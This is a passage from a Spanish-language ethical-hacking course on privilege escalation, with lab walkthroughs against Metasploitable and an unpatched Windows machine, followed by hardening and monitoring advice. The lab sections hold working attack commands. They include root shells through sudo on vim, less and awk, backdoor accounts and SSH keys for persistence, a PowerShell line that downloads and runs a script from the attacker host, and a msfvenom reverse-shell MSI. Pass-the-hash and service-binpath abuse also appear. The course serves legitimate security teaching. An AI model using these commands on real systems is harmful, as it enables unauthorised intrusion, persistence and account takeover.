## 5. HERRAMIENTAS DE RECONOCIMIENTO

### 5.1. Linux Enum Tools

**LinEnum:**

```bash
# Descargar
wget https://github.com/rebootuser/LinEnum/archive/refs/heads/master.zip
unzip master.zip

# Ejecutar
./LinEnum.sh -s -k password -r report -e /tmp/exports -t

# Opciones:
# -s: Ejecutar comandos sudo
# -k: Buscar palabra clave
# -r: Generar reporte
# -e: Directorio de exports
# -t: Realizar tests de escalación
```

**LinPEAS:**

```bash
# Descargar
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh

# Ejecutar
chmod +x linpeas.sh
./linpeas.sh -a 2>&1 | tee linpeas_output.txt

# Con colores (deshabilitar si output a archivo)
./linpeas.sh -a | tee linpeas_output.txt

# Solo archivos interesante
./linpeas.sh -s
```

**linux-exploit-suggester:**

```bash
# Descargar
wget https://github.com/mzet-/linux-exploit-suggester/raw/main/les.sh

# Ejecutar
chmod +x les.sh
./les.sh

# Con kernel específico
./les.sh --kernel 2.6.24
```

**pspy:**

```bash
# Para ver procesos sin ser root
wget https://github.com/DominicBreuker/pspy/releases/latest/download/pspy64
chmod +x pspy64
./pspy64
```

### 5.2. Windows Enum Tools

**WinPEAS:**

```powershell
# Descargar
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEAS.bat
# o la versión exe
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASx64.exe

# Ejecutar
winPEAS.bat
winPEASx64.exe quiet cmd
```

**PowerUp:**

```powershell
# Cargar en memoria
powershell -ExecutionPolicy Bypass -c ". .\PowerUp.ps1"

# Ejecutar todos los checks
Invoke-AllChecks

# Tests específicos
Invoke-ServiceAbuse -Name "ServiceName"
Get-UnquotedServicePath
Get-ServiceDetail -Name "ServiceName"
```

**Seatbelt:**

```powershell
# Descargar
wget https://github.com/GhostPack/Seatbelt/releases/latest/download/Seatbelt.exe

# Ejecutar checks de escalación
.\Seatbelt.exe -group=system

# Todos los checks
.\Seatbelt.exe -group=all
```

**Sherlock.ps1:**

```powershell
# Buscar exploits de Windows
powershell -ExecutionPolicy Bypass -c ". .\Sherlock.ps1; Find-AllVulns"
```

### 5.3. Scripts Automatizados en Metasploit

```bash
# Si tienes shell meterpreter
# Usar post/multi/recon/local_exploit_suggester

meterpreter > run post/multi/recon/local_exploit_suggester

# Módulo de escalación de Linux
meterpreter > run post/linux/escalate/capabilities

# Módulo de escalación de Linux (sudo)
meterpreter > run post/linux/gather/enum_configs

# Módulo de escalación de Windows
meterpreter > run post/windows/escalate/bypassuac
meterpreter > run post/windows/escalate/bypassuac_injection
```

---

## 6. LABORATORIO PRÁCTICO: METASPLOITABLE

### 6.1. Entorno de Prueba

```
┌─────────────────────────────────────────────────────────────────┐
│                LABORATORIO: ESCALACIÓN EN METASPLOITABLE         │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  ┌──────────────┐         ┌──────────────┐                     │
│  │  Kali Linux  │◄────────►│ Metasploitable│                     │
│  │  Atacante    │         │              │                     │
│  │              │         │ user: msfadmin │                     │
│  │ 192.168.56.101│         │ 192.168.56.102│                     │
│  └──────────────┘         └──────────────┘                     │
│                                                                 │
│  OBJETIVO: Escalara root en Metasploitable                     │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

### 6.2. Paso 1: Acceso Inicial

```bash
# Conectar via SSH como msfadmin
ssh msfadmin@192.168.56.102
# Password: msfadmin

# O usar metasploit para obtener shell
msfconsole -q
> use exploit/unix/ssh/exp_metasploit
> set rhosts 192.168.56.102
> set username msfadmin
> set password msfadmin
> exploit

# Obtener shell
meterpreter > shell
```

### 6.3. Paso 2: Recopilación de Información

```bash
# En la shell de metasploitable
id
# uid=1000(msfadmin) gid=1000(msfadmin) groups=1000(msfadmin)

uname -a
# Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686 GNU/Linux

cat /etc/passwd | grep msfadmin
# msfadmin:x:1000:1000:msfadmin,,,:/home/msfadmin:/bin/bash

# Verificar sudo
sudo -l
# [sudo] password for msfadmin: msfadmin

# Output:
# User msfadmin may run the following commands on this host:
#     (ALL) ALL
#     (root) NOPASSWD: /usr/bin/vim
#     (root) NOPASSWD: /bin/ash
#     (root) NOPASSWD: /usr/bin/less
#     (root) NOPASSWD: /usr/bin/awk
#     (root) NOPASSWD: /bin/tcsh
#     (root) NOPASSWD: /bin/ash
```

### 6.4. Paso 3: Explotación

**Opción 1: vim**

```bash
sudo vim -c ':!/bin/sh'
# ¡Ya eres root!
id
# uid=0(root) gid=0(root)
```

**Opción 2: less**

```bash
sudo less /etc/passwd
# Dentro de less:
!/bin/bash
```

**Opción 3: awk**

```bash
sudo awk 'BEGIN {system("/bin/bash")}'
```

### 6.5. Paso 4: Verificación y Consolidación

```bash
# Verificar root
whoami
# root

# Crear cuenta de respaldo (persistência)
useradd -m -s /bin/bash backup
echo "backup:P@ssw0rd" | chpasswd
usermod -aG sudo backup

# O agregar clave SSH
mkdir .ssh
echo "ssh-rsa AAAAB3Nza..." >> .ssh/authorized_keys
```

---

## 7. LABORATORIO PRÁCTICO: MÁQUINA WINDOWS

### 7.1. Entorno de Prueba

```
┌─────────────────────────────────────────────────────────────────┐
│               LABORATORIO: ESCALACIÓN EN WINDOWS                 │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  ┌──────────────┐         ┌──────────────┐                     │
│  │  Kali Linux  │◄────────►│   Windows    │                     │
│  │  Atacante    │         │   Victim     │                     │
│  │              │         │              │                     │
│  │ 192.168.56.101│         │ 192.168.56.105│                     │
│  └──────────────┘         └──────────────┘                     │
│                                                                 │
│  Windows sin parches recientes                                  │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

### 7.2. Paso 1: Acceso Inicial (Ejemplo)

```bash
# Conectar via psexec (hash known)
impacket-psexec -hashes :aad3b435b51404eeaad3b435b51404ee:32ed87b5215f6ad2ba97429d4a014f9 administrator@192.168.56.105

# O exploitando servicio vulnerable
msfconsole -q
> use exploit/windows/smb/ms17_010_psexec
> set rhosts 192.168.56.105
> set payload windows/x64/meterpreter/reverse_tcp
> set lhost 192.168.56.101
> exploit

# Obtener shell
meterpreter > shell
```

### 7.3. Paso 2: Recopilación de Información

```cmd
# En cmd.exe
whoami
whoami /all

# Grupo actual
whoami /groups

# Privilegios
whoami /priv

# Ver si somos admin
net localgroup administrators

# Sistema
systeminfo
hostname

# Buscar exploits
powershell -c "IEX (New-Object Net.WebClient).DownloadString('http://192.168.56.101/Sherlock.ps1')"
```

### 7.4. Paso 3: Identificar Vector de Escalación

**Opción A: Servicio con permisos débiles**

```cmd
# Verificar servicios con accesschk
C:\> accesschk.exe -uwcqv "Users" * /accepteula

# Output vulnerable:
# RW AngeloDev
# SERVICE_ALL_ACCESS
```

**Opción B: Unquoted Service Path**

```powershell
# Buscar servicios
powershell -ExecutionPolicy Bypass -c ". .\PowerUp.ps1; Get-UnquotedServicePath"

# Output:
# Name        : AngeloDev
# Path        : C:\Program Files\Custom Software\Dev App\devapp.exe
# Auto        : Auto
# Version     : Windows 10
```

**Opción C: AlwaysInstallElevated**

```cmd
reg query "HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer" /v AlwaysInstallElevated
reg query "HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer" /v AlwaysInstallElevated

# Si ambos son 1:
# Explotar con MSI
```

### 7.5. Paso 4: Explotación

**Explotación de AlwaysInstallElevated:**

```bash
# En Kali, generar MSI malicioso
msfvenom -p windows/meterpreter/reverse_tcp \
    LHOST=192.168.56.101 \
    LPORT=4444 \
    -f msi -o shell.msi

# Iniciar listener
msfconsole -q
> use multi/handler
> set payload windows/meterpreter/reverse_tcp
> set lhost 192.168.56.101
> exploit
```

**En Windows:**

```cmd
# Transferir archivo
certutil -urlcache -split -f http://192.168.56.101/shell.msi C:\Windows\Temp\shell.msi

# Ejecutar
msiexec /quiet /qn /i C:\Windows\Temp\shell.msi
```

**Explotación de servicio con permisos débiles:**

```cmd
# Modificar binpath
sc config AngeloDev binpath= "cmd /c net user attacker P@ssw0rd123! /add && net localgroup administrators attacker /add"
net start AngeloDev
```

### 7.6. Paso 5: Verificación

```cmd
# En meterpreter con privilegios elevados
meterpreter > getuid
# Server username: NT AUTHORITY\SYSTEM

# O en cmd
whoami
# nt authority\system

# Crear cuenta de respaldo
net user attacker P@ssw0rd123! /add
net localgroup administrators attacker /add
```

---

## 8. CONTRAMEDIDAS Y PREVENCIÓN

### 8.1. Hardening de Linux

```bash
# ============= PERMISOS DE ARCHIVOS =============

# Proteger archivos sensibles
chmod 000 /etc/shadow
chmod 000 /etc/gshadow
chmod 644 /etc/passwd
chmod 644 /etc/group

# Proteger binarios SUID problemáticos
chmod -s /usr/bin/newgrp
chmod -s /usr/bin/gpasswd

# Remover SUID de binarios innecesarios
chmod -s /usr/bin/at
chmod -s /usr/bin/crontab

# ============= CONFIGURACIÓN DE SUDO =============

# Revisar sudoers regularmente
visudo

# No permitir shells desde sudoers
# BAD: user ALL=(ALL) /bin/bash
# GOOD: user ALL=(ALL) /usr/bin/whoami

# Limitar comandos específicos
user ALL=(ALL) /usr/bin/systemctl status apache2

# ============= SEGURIDAD DE KERNEL =============

# Habilitar ASLR
echo 2 > /proc/sys/kernel/randomize_va_space

# Deshabilitar IP forwarding
echo 0 > /proc/sys/net/ipv4/ip_forward

# Proteger enlaces simbólicos
echo 1 > /proc/sys/fs/protected_symlinks

# Deshabilitar ICMP redirects
echo 0 > /proc/sys/net/ipv4/conf/all/accept_redirects
echo 0 > /proc/sys/net/ipv6/conf/all/accept_redirects

# ============= ACTUALIZACIONES =============

# Habilitar actualizaciones automáticas
apt install unattended-upgrades
dpkg-reconfigure unattended-upgrades
```

### 8.2. Hardening de Windows

```powershell
# ============= FIREWALL =============

# Habilitar firewall en todos los perfiles
Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled True

# ============= POLÍTICAS DE SEGURIDAD =============

# Deshabilitar LM hash
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" -Name "NoLMHash" -Value 1

# No almacenar hashes LAN Manager
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" -Name "LmCompatibilityLevel" -Value 5

# DeshabilitarWDigest Authentication
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest" -Name "UseLogonCredential" -Value 0

# ============= SERVICIOS =============

# Deshabilitar servicios innecesarios
Stop-Service -Name "Spooler" -Force
Set-Service -Name "Spooler" -StartupType Disabled

# ============= REGISTRO =============

# Remover archivos de configuración sensibles
Remove-Item C:\Windows\Panther\Unattend.xml -Force -ErrorAction SilentlyContinue
Remove-Item C:\Windows\Panther\Sysprep.inf -Force -ErrorAction SilentlyContinue
Remove-Item C:\Windows\Panther\Sysprep\Unattend.xml -Force -ErrorAction SilentlyContinue

# ============= USUARIOS =============

# Renombrar Administrator
Rename-ADObject "CN=Administrator,CN=Users,DC=domain,DC=local" -NewName "AdminSecreto"

# Deshabilitar cuenta de invitado
net user guest /active:no

# ============= UAC =============

# Habilitar UAC
Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "EnableLUA" -Value 1

# ============= WINDOWS DEFENDER =============

# Habilitar Windows Defender
Set-MpPreference -DisableRealtimeMonitoring $false
```

### 8.3. Monitoreo y Detección

**En Linux:**

```bash
# ============= LOGGING =============

# Configurar rsyslog para enviar logs centralizados
# /etc/rsyslog.conf
*.* @@logserver.company.com:514

# Habilitar auditd
apt install auditd
systemctl enable auditd

# Reglas de auditd
# /etc/audit/rules.d/audit.rules
-a always,exit -F arch=b64 -S execve -k command_execution
-w /etc/passwd -p wa -k password_changes
-w /etc/shadow -p wa -k password_changes

# ============= INTEGRITY CHECKING =============

# Instalar AIDE (Advanced Intrusion Detection Environment)
apt install aide
aideinit
```

**En Windows:**

```powershell
# ============= WINDOWS EVENT LOGGING =============

# Habilitar logging de seguridad
auditpol /set /category:"Logon and Logoff" /success:enable /failure:enable
auditpol /set /category:"Account Management" /success:enable /failure:enable
auditpol /set /category:"Policy Change" /success:enable /failure:enable

# ============= WINDOWS DEFENDER ATP =============

# Si tienes Azure, usar Windows Defender ATP
# Configurar reglas de detección personalizada
```

### 8.4. Resumen de Mitigaciones

```
┌─────────────────────────────────────────────────────────────────┐
│               TABLA RESUMEN DE MITIGACIONES                      │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  VECTOR DE ESCALACIÓN  │  MITIGACIÓN                             │
│  ───────────────────────┼───────────────────────────────────── │
│  SUID/SGID vulnerable   │  Revisar permisos, actualizar software │
│  Config sudo incorrecta │  Least privilege, no wildcards        │
│  Kernel vulnerable      │  Actualizar kernel regularmente       │
│  NFS sin root_squash    │  root_squash en /etc/exports          │
│  Cron jobs escribibles  │  Permisos 644, owner root              │
│  Contraseñas en texto  │  Hash + salt, no almacenar passwords  │
│  Servicios con permisos │  Revisar ACLs con accesschk            │
│  Unquoted paths        │  Usar comillas, permisos correctos     │
│  AlwaysInstallElevated │  Deshabilitar en registry              │
│  DLL hijacking         │  Usar absolute paths, secure loading   │
│                                                                 │
│  MEJORES PRÁCTICAS:                                              │
│  • Least privilege (principio de menor privilegio)              │
│  • Defense in depth (defensa en profundidad)                   │
│  • Actualizaciones regulares                                    │
│  • Monitoreo continuo                                          │
│  • Segregación de redes                                        │
│  • Backup regulares                                            │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

---

## EJERCICIOS PRÁCTICOS

### Ejercicio 1: Escalada en Linux (Metasploitable)
1. Obtén acceso SSH como usuario msfadmin
2. Identifica vector de escalación usando `sudo -l`
3. Usa GTFOBins para obtener shell de root
4. Verifica con `id` y `whoami`

### Ejercicio 2: Escalada por SUID
1. Identifica binarios SUID con permisos incorrectos
2. Explota el binario para obtener root
3. Alternativas: LD_PRELOAD, PATH hijacking

### Ejercicio 3: Escalación Kernel Linux
1. Identifica versión de kernel
2. Busca exploit apropiado en exploit-db
3. Compila y ejecuta exploit
4. Verifica acceso como root

### Ejercicio 4: Escalación en Windows
1. Obtén acceso como usuario limitado
2. Ejecuta WinPEAS o PowerUp
3. Identifica vector de escalación
4. Explota para obtener SYSTEM

### Ejercicio 5: Pass-the-Hash
1. Extrae hashes con Mimikatz o SAM dump
2. Usa hash de administrator para conectarte
3. Verifica acceso sin conocer contraseña

---

## RECURSOS ADICIONALES

### Plataformas de Práctica
- **TryHackMe**: Rooms de privilege escalation
- **VulnHub**: Máquinas vulnerables
- **HackTheBox**: Desafíos de escalación
- **Offensive Pentesting (THM)**: Laboratorio completo

### Herramientas
- **LinPEAS**: Linux privilege escalation auditing
- **WinPEAS**: Windows privilege escalation auditing
- **GTFOBins**: Binarios Unix explotables
- **LOLBAS**: Binarios Windows explotables
- **PowerUp**: Windows privilege escalation

### Base de Datos de Exploits
- **exploit-db.com**: Base de datos de exploits
- **cvedetails.com**: Detalles de CVEs
- **nvd.nist.gov**: National Vulnerability Database

### Libros
- "Linux Privilege Escalation for OSCP" - Osanda Malith
- "Windows Privilege Escalation Fundamentals" - HackTricks
- "Privilege Escalation Techniques" - Ali Hz

---

**FIN DEL CURSO DE CIBERSEGURIDAD**

Este curso ha cubierto los fundamentos de hacking ético, desde el reconocimiento hasta la explotación y la escalación de privilegios. Recuerda siempre practicar en entornos legales y con autorización.
